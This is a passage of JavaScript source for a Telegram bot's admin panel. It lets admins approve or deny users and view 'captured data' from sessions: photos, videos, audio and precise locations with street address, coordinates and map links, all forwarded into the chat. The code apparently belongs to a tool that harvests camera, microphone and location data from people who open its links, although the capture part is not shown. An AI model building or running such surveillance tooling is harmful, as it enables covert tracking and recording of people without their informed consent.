        msg += `<b>Telegram ID:</b> <code>${user.telegramId}</code>\n`;
        msg += `<b>Status:</b> ${user.isApproved ? '✅ Approved' : '❌ Not Approved'}\n\n`;
        
        msg += `📊 <b>Sessions:</b> ${sessions.length}\n`;
        
        let totalMedia = 0;
        sessions.forEach(s => {
            totalMedia += s.mediaCount;
        });
        msg += `📁 <b>Total Media:</b> ${totalMedia}\n\n`;
        
        if (sessions.length > 0) {
            msg += `<b>Recent Sessions:</b>\n`;
            sessions.slice(0, 5).forEach((s, i) => {
                const statusEmoji = s.status === 'active' ? '🟢' : s.status === 'ended' ? '⚫' : '🔴';
                msg += `${i + 1}. ${statusEmoji} ${escapeHtml(s.permissionType)} (${s.mediaCount} files)\n`;
            });
            msg += `\n<i>Tap a session below to view captured data</i>`;
        }
        
        await ctx.editMessageText(msg, {
            parse_mode: 'HTML',
            ...userDetailKeyboard(targetTelegramId, user.isApproved, sessions)
        });
        
    } catch (error) {
        logger.error('Failed to get user data', { error: error.message });
        await ctx.reply('❌ Failed to load user data: ' + error.message);
    }
});

/**
 * Handle view session data (admin)
 */
bot.action(/^viewsession_(.+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const sessionId = ctx.match[1];
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getSessionMedia(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get media');
        }
        
        const { counts, media, permissionType } = result;
        const totalItems = counts.photos + counts.videos + counts.audio + counts.locations;
        
        if (totalItems === 0) {
            await ctx.reply('📭 No data captured in this session.');
            return;
        }
        
        // Summary message
        let summaryMsg = `📂 <b>SESSION DATA (Admin View)</b>\n\n`;
        summaryMsg += `<b>Type:</b> ${config.permissions[permissionType]?.label || permissionType}\n\n`;
        summaryMsg += `<b>📊 Captured Data:</b>\n`;
        if (counts.photos > 0) summaryMsg += `  📷 Photos: ${counts.photos}\n`;
        if (counts.videos > 0) summaryMsg += `  🎥 Videos: ${counts.videos}\n`;
        if (counts.audio > 0) summaryMsg += `  🎤 Audio: ${counts.audio}\n`;
        if (counts.locations > 0) summaryMsg += `  📍 Locations: ${counts.locations}\n`;
        
        await ctx.reply(summaryMsg, { parse_mode: 'HTML' });
        
        // Send locations with full details
        if (media.locations && media.locations.length > 0) {
            for (let i = 0; i < media.locations.length; i++) {
                const loc = media.locations[i];
                const data = loc.metadata;
                
                let locMsg = `📍 <b>LOCATION ${i + 1}</b>\n`;
                locMsg += `🕐 ${new Date(loc.createdAt).toLocaleString()}\n\n`;
                
                if (data.address) {
                    locMsg += `📌 <b>Address:</b>\n${data.address.formatted || data.address.displayName}\n\n`;
                    if (data.address.street) locMsg += `🏠 Street: ${data.address.street}\n`;
                    if (data.address.neighborhood) locMsg += `🏘️ Area: ${data.address.neighborhood}\n`;
                    if (data.address.city) locMsg += `🌆 City: ${data.address.city}\n`;
                    if (data.address.state) locMsg += `🗺️ State: ${data.address.state}\n`;
                    if (data.address.country) locMsg += `🌍 Country: ${data.address.country}\n`;
                    if (data.address.postalCode) locMsg += `📮 Postal: ${data.address.postalCode}\n`;
                }
                
                if (data.coordinates) {
                    locMsg += `\n🎯 <b>Coordinates:</b>\n`;
                    locMsg += `├ Lat: <code>${data.coordinates.latitude?.toFixed(6)}</code>\n`;
                    locMsg += `├ Lng: <code>${data.coordinates.longitude?.toFixed(6)}</code>\n`;
                    if (data.coordinates.accuracy) locMsg += `├ Accuracy: ${data.coordinates.accuracy.toFixed(1)}m\n`;
                }
                
                if (data.maps) {
                    locMsg += `\n🗺️ <a href="${data.maps.googleMaps}">Open in Google Maps</a>`;
                }
                
                await ctx.reply(locMsg, { parse_mode: 'HTML', disable_web_page_preview: false });
            }
        }
        
        // Send photos
        if (media.photos && media.photos.length > 0) {
            for (let i = 0; i < media.photos.length; i++) {
                const photo = media.photos[i];
                try {
                    const photoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${photo.id}/file`;
                    await ctx.replyWithPhoto(
                        { url: photoUrl },
                        { caption: `📷 Photo ${i + 1} - ${new Date(photo.createdAt).toLocaleString()}` }
                    );
                } catch (photoErr) {
                    logger.error('Failed to send photo', { error: photoErr.message });
                    await ctx.reply(`📷 Photo ${i + 1} - File: ${photo.fileName}`);
                }
            }
        }
        
        // Send videos
        if (media.videos && media.videos.length > 0) {
            for (let i = 0; i < media.videos.length; i++) {
                const video = media.videos[i];
                try {
                    const videoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${video.id}/file`;
                    await ctx.replyWithVideo(
                        { url: videoUrl },
                        { caption: `🎥 Video ${i + 1} - ${new Date(video.createdAt).toLocaleString()}` }
                    );
                } catch (videoErr) {
                    logger.error('Failed to send video', { error: videoErr.message });
                    await ctx.reply(`🎥 Video ${i + 1} - File: ${video.fileName}`);
                }
            }
        }
        
        // Send audio
        if (media.audio && media.audio.length > 0) {
            for (let i = 0; i < media.audio.length; i++) {
                const audio = media.audio[i];
                try {
                    const audioUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${audio.id}/file`;
                    await ctx.replyWithAudio(
                        { url: audioUrl },
                        { caption: `🎤 Audio ${i + 1} - ${new Date(audio.createdAt).toLocaleString()}` }
                    );
                } catch (audioErr) {
                    logger.error('Failed to send audio', { error: audioErr.message });
                    await ctx.reply(`🎤 Audio ${i + 1} - File: ${audio.fileName}`);
                }
            }
        }
        
        logger.info('Admin viewed session data', { sessionId, adminId: adminUser.id });
        
    } catch (error) {
        logger.error('Failed to get session data', { error: error.message });
        await ctx.reply('❌ Failed to load session data: ' + error.message);
    }
});

/**
 * Handle approve user
 */
bot.action(/^approve_(\d+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const targetTelegramId = parseInt(ctx.match[1]);
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.approveUser(targetTelegramId, adminUser.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to approve user');
        }
        
        await ctx.reply(
            `✅ *User Approved!*\n\n` +
            `User: ${result.user.firstName || result.user.username || targetTelegramId}\n` +
            `They can now use the bot.`,
            { parse_mode: 'Markdown' }
        );
        
        // Notify the user
        try {
            await ctx.telegram.sendMessage(
                targetTelegramId,
                '🎉 *Access Granted!*\n\n' +
                'Your access request has been approved!\n' +
                'You can now use all bot features.\n\n' +
                'Type /start to begin.',
                { parse_mode: 'Markdown' }
            );
        } catch (notifyErr) {
            logger.error('Failed to notify approved user', { error: notifyErr.message });
        }
        
        logger.info('User approved', { targetTelegramId, approvedBy: adminUser.id });
        
    } catch (error) {
        logger.error('Failed to approve user', { error: error.message });
        await ctx.reply('❌ Failed to approve user: ' + error.message);
    }
});

/**
 * Handle deny user
 */
bot.action(/^deny_(\d+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const targetTelegramId = parseInt(ctx.match[1]);
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.denyUser(targetTelegramId, adminUser.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to deny user');
        }
        
        await ctx.reply(
            `❌ *User Access Denied/Revoked*\n\n` +
            `User: ${result.user.username || targetTelegramId}\n` +
            `They can no longer use the bot.`,
            { parse_mode: 'Markdown' }
        );
        
        // Notify the user
        try {
            await ctx.telegram.sendMessage(
                targetTelegramId,
                '🔒 *Access Denied*\n\n' +
                'Your access has been denied or revoked.\n' +
                `Contact ${config.admin.contact} if you think this is a mistake.`,
                { parse_mode: 'Markdown' }
            );
        } catch (notifyErr) {
            logger.error('Failed to notify denied user', { error: notifyErr.message });
        }
        
        logger.info('User access denied', { targetTelegramId, deniedBy: adminUser.id });
        
    } catch (error) {
        logger.error('Failed to deny user', { error: error.message });
        await ctx.reply('❌ Failed to deny user: ' + error.message);
    }
});

/**
 * Handle back to menu
 */
bot.action('admin_back', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.deleteMessage().catch(() => {});
    await ctx.reply(
        '👑 Back to main menu',
        adminMenuKeyboard
    );
});

// ============================================
// Error Handling
// ============================================

bot.catch((err, ctx) => {
    logger.error('Bot error', {
        error: err.message,
        updateType: ctx.updateType
    });
});

// ============================================
// Exports
// ============================================

module.exports = bot;
